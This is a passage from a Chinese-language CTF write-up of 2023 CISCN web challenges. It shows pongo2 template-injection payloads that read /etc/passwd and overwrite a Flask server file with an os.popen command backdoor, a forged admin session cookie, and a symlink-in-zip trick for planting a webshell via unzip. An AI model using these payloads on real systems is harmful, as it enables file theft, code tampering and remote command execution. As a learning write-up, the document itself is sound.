http.StatusInternalServerError)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//以GET方式向http://127.0.0.1:5000/发送请求，请求c中若无name参数，默认值为guset</span></span><br><span class="line">   resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">    <span class="comment">//读取响应包数据体</span></span><br><span class="line">   body, _ := io.ReadAll(resp.Body)</span><br><span class="line">   <span class="comment">//响应码200，打印响应包数据</span></span><br><span class="line">   c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到<code>ssti</code>，这里想到利用的就是<code>admin</code>和<code>flask</code>路由</p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a><code>SSTI</code></h2><h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><p><code>flask</code>中，没有模板注入处，只有一个获取本地响应包数据的代码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>看到是发起本地请求，获取响应</p>
<p>想到的就是能不能读取到本地一些文件的数据</p>
<p>它会读取<code>http</code>请求中<code>name</code>参数，并加到<code>http://127.0.0.1:5000/</code>后面</p>
<p>所以构造类似</p>
<blockquote>
<p>url&#x2F;flask?name&#x3D;xx</p>
</blockquote>
<p>但是开始没啥思路，但是看到启动<code>main.go</code>时发现是启动默认打开debug模式，debug模式就会将一些代码内容也显示出来，而不是简单的400</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615174941369.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615174941369.png" alt="image-20230615174941369"></a></p>
<p>所以猜想能不能利用flask下发送错误请求，导致代码报错</p>
<p>于是构造</p>
<blockquote>
<p>url&#x2F;flask?name&#x3D;&#x2F;</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615181737962.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615181737962.png" alt="image-20230615181737962"></a></p>
<p>这里得到<code>/app/server.py</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到确实是打开debug</p>
<p>在底下还可以看到</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615185901343.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615185901343.png" alt="image-20230615185901343"></a></p>
<p>但是并不知道PIN码是多少，所以也不能利用这个地方实现交互式shell，本来想看看PIN码能不能利用SSTI读取成功，但是SSTI也不轻松，解决了SSTI题目应该也就已经解出了</p>
<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>但是<code>admin</code>中，需要<code>session</code>中<code>name</code>参数为<code>admin</code></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">    http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>而<code>session</code>生成需要环境变量<code>SESSION_KEY</code>，而这个根本不知道</p>
<p><code>session</code>的生成在index中，尝试修改本地index中的代码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">   <span class="comment">//session.Values[&quot;name&quot;] = &quot;guest&quot;，修改guest为admin</span></span><br><span class="line">   session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">   err = session.Save(c.Request, c.Writer)</span><br></pre></td></tr></table></figure>

<p>这样就会将<code>session</code>中的<code>name</code>设为<code>admin</code></p>
<p>但是本地这里<code>SESSION_KEY</code>为空，本地运行代码后获得的<code>session-name</code></p>
<p>我试了一下，发现把其代入题目中也可以，所以题目环境中<code>SESSION_KEY</code>也是空</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615171345355.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615171345355.png" alt="image-20230615171345355"></a></p>
<blockquote>
<p>MTY4NjgxODM4NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzwtTk7ay4mTCPFS8SyBfs6-bFy8R09M_ne8m4QhPXjxQ&#x3D;&#x3D;</p>
</blockquote>
<p>再根据代码中模板注入点</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	<span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br></pre></td></tr></table></figure>

<p>会将<code>name</code>参数进行符合转义后，传入pongo2模板引擎中进行渲染，可以简单构造一下</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615190608112.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230615190608112.png" alt="image-20230615190608112"></a></p>
<p>发现确实是可以的，但是<code>html.EscapeString(name)</code>把大部分字符都转义了，所以进行ssti也不容易</p>
<p>去了解一下Pongo2，发现<code>Pongo2</code> 库是一个受 <code>Django</code> 模板引擎启发的 Go 模板引擎。</p>
<p>所以能在<code>Django</code>进行的注入，在<code>Pongo2</code>上有极大可能执行成功</p>
<h4 id="Pongo2"><a href="#Pongo2" class="headerlink" title="Pongo2"></a>Pongo2</h4><p>在<a href="https://pkg.go.dev/github.com/flosch/pongo2#section-readme">pongo2 package - github.com&#x2F;flosch&#x2F;pongo2 - Go Packages</a>这里查看，发现有其和<code>Django 1.7</code>相似的地方</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617173702284.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617173702284.png" alt="image-20230617173702284"></a></p>
<p>就先看看<code>Django 1.7</code>的标签</p>
<p><a href="https://django.readthedocs.io/en/1.7.x/ref/templates/builtins.html#ref-templates-builtins-tags">Built-in template tags and filters — Django 1.7.11 documentation</a></p>
<p>主要看三个，也就是ssti常见的rce，uploadfile，includefile</p>
<h5 id="include"><a href="#include" class="headerlink" title="include"></a>include</h5><p><a href="https://django.readthedocs.io/en/1.7.x/ref/templates/builtins.html#include">Built-in template tags and filters — Django 1.7.11 documentation</a></p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617174133634.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617174133634.png" alt="image-20230617174133634"></a></p>
<blockquote>
<p>发现可以进行</p>
<p><code>&#123;%include "foo/bar.html" %&#125;</code>来包含某个文件，但是因为代码中对单双引号进行转义，所以只能包含变量，所以要构造一个可控变量</p>
<p>而代码中发现，在各个函数中只有一个变量可以控制，就是<code>c</code>，而<code>c</code>的定义是<code>c *gin.Contex</code></p>
</blockquote>
<p>所以查看<code>gin</code>文档中，<code>c</code>应该如何控制，实现传参</p>
<h5 id="gin-gonic-gin-Context"><a href="#gin-gonic-gin-Context" class="headerlink" title="gin-gonic&#x2F;gin#Context"></a>gin-gonic&#x2F;gin#Context</h5><p><a href="https://pkg.go.dev/github.com/gin-gonic/gin">gin package - github.com&#x2F;gin-gonic&#x2F;gin - Go Packages</a></p>
<p>发现<code>Context</code>是一个结构体</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617175336936.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617175336936.png" alt="image-20230617175336936"></a></p>
<p>有一个http请求包数据的指针，可以获得其内容</p>
<p>查看这个<code>request</code>中内容，</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Request <span class="keyword">struct</span> &#123;</span><br><span class="line">	Method <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	URL *url.URL</span><br><span class="line"></span><br><span class="line">	Proto      <span class="type">string</span> <span class="comment">// &quot;HTTP/1.0&quot;</span></span><br><span class="line">	ProtoMajor <span class="type">int</span>    <span class="comment">// 1</span></span><br><span class="line">	ProtoMinor <span class="type">int</span>    <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">	Header Header</span><br><span class="line"></span><br><span class="line">	Body io.ReadCloser</span><br><span class="line"></span><br><span class="line">	GetBody <span class="function"><span class="keyword">func</span><span class="params">()</span></span> (io.ReadCloser, <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line">	ContentLength <span class="type">int64</span></span><br><span class="line"></span><br><span class="line">	TransferEncoding []<span class="type">string</span></span><br><span class="line"></span><br><span class="line">	Close <span class="type">bool</span></span><br><span class="line"></span><br><span class="line">	Host <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	Form url.Values</span><br><span class="line"></span><br><span class="line">	PostForm url.Values</span><br><span class="line"></span><br><span class="line">	MultipartForm *multipart.Form</span><br><span class="line"></span><br><span class="line">	Trailer Header</span><br><span class="line"></span><br><span class="line">	RemoteAddr <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	RequestURI <span class="type">string</span></span><br><span class="line"></span><br><span class="line">	TLS *tls.ConnectionState</span><br><span class="line"></span><br><span class="line">	Cancel &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">	Response *Response</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找寻其中可控参数</p>
<blockquote>
<p>发现有</p>
<p>URL Header Host</p>
</blockquote>
<h5 id="SaveUploadedFile"><a href="#SaveUploadedFile" class="headerlink" title="SaveUploadedFile"></a><a href="https://github.com/gin-gonic/gin/blob/v1.9.1/context.go#L599">SaveUploadedFile</a></h5><p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617180158976.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617180158976.png" alt="image-20230617180158976"></a></p>
<p>需要传两个参数，文件（form表单中name的参数）和文件具体位置（path&#x2F;文件名）</p>
<h4 id="读文件x"><a href="#读文件x" class="headerlink" title="读文件x"></a>读文件x</h4><p>开始看马✌发的可以进行读取文件这个</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GET /admin?A&amp;name=&#123;%25include%20c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%25&#125; HTTP/1.1</span><br><span class="line">Host: xxx</span><br><span class="line">A: /etc/passwd</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: session-name=MTY4NjgxODM4NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzwtTk7ay4mTCPFS8SyBfs6-bFy8R09M_ne8m4QhPXjxQ==</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230616160949211.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230616160949211.png" alt="image-20230616160949211"></a></p>
<blockquote>
<p><code>&#123;%include c.Request.Header[c.Request.URL.RawQuery|truncatechars:1]|join%&#125;</code></p>
<p><code>%</code>需要进行<code>url</code>编码发包才能被解析，不然读不到<code>name</code>参数</p>
<p><code>&#123;%include %&#125;</code></p>
<blockquote>
<p>进行包含文件</p>
</blockquote>
<p><code>c</code></p>
<blockquote>
<p>在附件go代码中可以看到<code>c *gin.Context</code>表示一个 Gin 框架处理 HTTP 请求的上下文对象，它包含了 HTTP 请求和响应的所有信息，所以<code>c</code>就是一个HTTP请求和响应集合对象</p>
</blockquote>
<p><code>c.Request.Header</code></p>
<blockquote>
<p>是只读取请求头内容，也就是xx: xxx [如，<code>Accept-Encoding: gzip, deflate</code>]</p>
</blockquote>
<p><code>c.Request.URL.RawQuery</code></p>
<blockquote>
<p>读取URL头中的参数值</p>
</blockquote>
<p><code>truncatechars:1</code></p>
<blockquote>
<p><code>truncatechars</code>是 Flask 模板引擎中的过滤器，它的作用是截断字符串并返回指定长度的子字符串。在这个过滤器中，<code>:1</code> 表示要截断的长度为 1。[如上文中请求行所示，url中第一个就是A参数]</p>
</blockquote>
<p><code>join</code></p>
<blockquote>
<p>将获取到的值拼接成一个字符串并返回。</p>
</blockquote>
</blockquote>
<p>我就一直在读文件，想去读取<code>machine_id</code>和<code>mac地址</code>然后得到<code>PIN码</code>，利用<code>debug</code>进行交互shell执行命令</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617143635583.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617143635583.png" alt="image-20230617143635583"></a></p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617142812454.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617142812454.png" alt="image-20230617142812454"></a></p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617142840187.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617142840187.png" alt="image-20230617142840187"></a></p>
<p>但是后面看到浪✌和几位✌说的，似乎并不可行</p>
<p>因为<code>pin rce</code>是需要设置<code>cookie</code>头的，而且<code>pin rce</code>也没法<code>crlf</code>，所以靠<code>ssti</code>读文件也没法继续进行</p>
<h4 id="写文件√"><a href="#写文件√" class="headerlink" title="写文件√"></a>写文件√</h4><p>所以就想办法尝试写文件，但是不清楚网站目录以及运行文件</p>
<p>可是根据之前<code>debug</code>得到的<code>server.py</code>文件，这是网站运行的<code>py</code>文件，在<code>/app/server.py</code>中</p>
<p>尝试上传覆盖，但是由于是<code>GET</code>读取参数，所以在<code>GET</code>提交中，<u>添加上传文件表单</u>，将<code>server.py</code>中修改，增加解析<code>name</code>参数，实现命令执行并显示执行内容</p>
<blockquote>
<p>GET请求也可以提交表单上传文件</p>
</blockquote>
<p>根据<code>debug</code>代码修改得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    res = os.popen(name).read()</span><br><span class="line">    <span class="keyword">return</span> res + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>于是构造GET请求行，进行文件上传覆盖</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">/admin?name=&#123;%<span class="built_in">set</span> <span class="attribute">form</span>=c.Query(c.HandlerName|first)%&#125;&#123;%<span class="built_in">set</span> <span class="attribute">path</span>=c.Query(c.HandlerName|last)%&#125;&#123;%<span class="built_in">set</span> <span class="attribute">file</span>=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;<span class="attribute">m</span>=file&amp;n=/app/server.py</span><br></pre></td></tr></table></figure>

<p>解析一下payload，首先先要去官方文档查看<code>c *Context</code>的方法发现有个上传文件的方法<code>SaveUploadedFile</code></p>
<blockquote>
<p><code>&#123;%set form=c.Query(c.HandlerName|first)%&#125;&#123;%set path=c.Query(c.HandlerName|last)%&#125;&#123;%set file=c.FormFile(form)%&#125;&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;&amp;m=file&amp;n=/app/server.py</code></p>
<p><code>&#123;% set %&#125;</code></p>
<blockquote>
<p>进行设置参数值</p>
</blockquote>
<p><code>c.Query()</code></p>
<blockquote>
<p>是获取url中参数</p>
</blockquote>
<p><code>(c.HandlerName|first)</code>   </p>
<blockquote>
<p><code>c.HandlerName</code>是获取当前的url  </p>
<p><code>first</code>是指定获取url中的第一个参数，即<code>m</code>参数值<code>file</code></p>
<p><code>last</code>是获取url中最后一个参数，即<code>n</code>参数值<code>/app/server.py</code></p>
</blockquote>
<p><code>form</code> <code>path</code></p>
<blockquote>
<p>就是读取<code>url</code>参数，进行赋值</p>
<p>于是</p>
<p><code>form=file</code></p>
<p><code>path=/app/server.py</code></p>
</blockquote>
<p><code>&#123;&#123;c.SaveUploadedFile(file,path)&#125;&#125;</code></p>
<blockquote>
<p>将上传的文件保存到指定的路径中。其中 <code>file</code> 参数表示要保存的文件，<code>path</code> 参数表示要保存到的路径。</p>
</blockquote>
</blockquote>
<p>改包发送</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin?name=%7B%25set%20form%3Dc.Query(c.HandlerName%7Cfirst)%25%7D%7B%25set%20path%3Dc.Query(c.HandlerName%7Clast)%25%7D%7B%25set%20file%3Dc.FormFile(form)%25%7D%7B%7Bc.SaveUploadedFile(file%2Cpath)%7D%7D&amp;m=file&amp;n=/app/server.py</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.92.233.116:12345</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryqwT9VdDXSgZPm0yn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session-name=MTY4NjgxODM4NHxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzwtTk7ay4mTCPFS8SyBfs6-bFy8R09M_ne8m4QhPXjxQ==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>562</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryqwT9VdDXSgZPm0yn</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;server.py&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/jpeg</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-pgsql">app = Flask(__name__)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@app.route(<span class="string">&#x27;/&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql">def <span class="keyword">index</span>():</span></span><br><span class="line"><span class="language-pgsql">    <span class="type">name</span> = request.args[<span class="string">&#x27;name&#x27;</span>]</span></span><br><span class="line"><span class="language-pgsql">    res = os.popen(<span class="type">name</span>).<span class="keyword">read</span>()</span></span><br><span class="line"><span class="language-pgsql">    <span class="keyword">return</span> res + &quot; no ssti&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="keyword">if</span> __name__ == &quot;__main__&quot;:</span></span><br><span class="line"><span class="language-pgsql">    app.run(host=&quot;127.0.0.1&quot;, port=<span class="number">5000</span>, <span class="keyword">debug</span>=<span class="keyword">True</span>)</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryqwT9VdDXSgZPm0yn</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">提交</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryqwT9VdDXSgZPm0yn--</span></span></span><br></pre></td></tr></table></figure>

<p>*注意：需要添加</p>
<blockquote>
<p><strong>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundaryqwT9VdDXSgZPm0yn</strong></p>
<p>添加表单文件类型，以及分界符号，这就是GET提交上传文件表单和POST请求提交不同之处</p>
</blockquote>
<p>写入文件</p>
<p><a data-fancybox="gallery" data-src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617170338372.png"><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617170338372.png" alt="image-20230617170338372"></a></p>
<blockquote>
<p>&#x2F;flask?name&#x3D;?name&#x3D;ls${IFS}&#x2F;</p>
<p>*同上面对flask代码的分析</p>
<p>它会将name后的参数直接加到<a href="http://127.0.0.1:5000/%E5%90%8E%E9%9D%A2%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%60server.py%60%E8%BF%90%E8%A1%8C%E7%9A%84%E7%AB%AF%E5%8F%A3">http://127.0.0.1:5000/后面，也就是`server.py`运行的端口</a></p>
<p>所以这里直接将<code>?name=ls$&#123;IFS&#125;/</code>作为<code>flask</code>的<code>name</code>参数的值</p>
<p>如修改后的代码知道，<code>server.py</code>会执行<code>name</code>参数中的命令，从而实现</p>
</blockquote>
<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617185023757.png" alt="image-20230617185023757" style="zoom:80%;">

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/flask?name=?name=<span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/th1s_1s_f13g</span><br></pre></td></tr></table></figure>

<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230617170612349.png" alt="image-20230617170612349" style="zoom:80%;">

<p>得得flag（nnd，flag名字就不能正常一点吗，不然读文件就解决了</p>
<p>结束</p>
<h1 id="reading"><a href="#reading" class="headerlink" title="reading"></a>reading</h1><blockquote>
<p>题目内容：</p>
<p>读点什么呢？</p>
</blockquote>
<p>与蓝帽杯这道<code>file_session</code>题目很像<a href="https://forum.butian.net/share/1760">奇安信攻防社区-2022蓝帽杯初赛WriteUp (butian.net)</a></p>
<h1 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h1><blockquote>
<p>题目内容：</p>
<p>unzip很简单，但是同样也很危险</p>
</blockquote>
<p>几乎原题[<a href="https://bbs.kanxue.com/thread-270353.htm#msg_header_h3_4">原创]2021深育杯线上初赛官方WriteUp-CTF对抗-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p>开始上传</p>
<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824095547698.png" alt="image-20230824095547698" style="zoom:80%;">

<p>页面跳转到<code>upload.php</code>代码分析</p>
<h2 id="代码分析以及流程"><a href="#代码分析以及流程" class="headerlink" title="代码分析以及流程"></a>代码分析以及流程</h2><img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824100144547.png" alt="image-20230824100144547" style="zoom:80%;">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//only this!</span></span><br></pre></td></tr></table></figure>

<p> 首先对上传文件的类型进行了判断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>需要上传的文件类型为<code>application/zip</code>，然后执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><p>发现上传的压缩包中文件都被解压在了<code>tmp</code>目录下，如果想要访问，就需要利用软链接，从<code>/tmp</code>链接到<code>/var/www/html</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /var/www/html <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824095110642.png" alt="image-20230824095110642" style="zoom:80%;">

<p>但是想要把软链接打包在压缩包中，需要加上参数<code>--symlinks</code>，如果不加上，压缩软链接会把它们指向的实际文件或文件夹压缩进去，而不是保留软链接本身。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip --symlinks <span class="built_in">test</span> ./*</span><br></pre></td></tr></table></figure>

<p>这样<code>test</code>就指向了<code>/var/www/html</code></p>
<img src="/2023CISCN%E5%88%9D%E8%B5%9B/image-20230824105720266.png" alt="image-20230824105720266" style="zoom:80%;">

<h3 id="构造木马压缩包"><a href="#构造木马压缩包" class="headerlink" title="构造木马压缩包"></a>构造木马压缩包</h3><p>然后建一个相同名字的文件夹<code>test</code>，向其中放入一句话🐎</p>
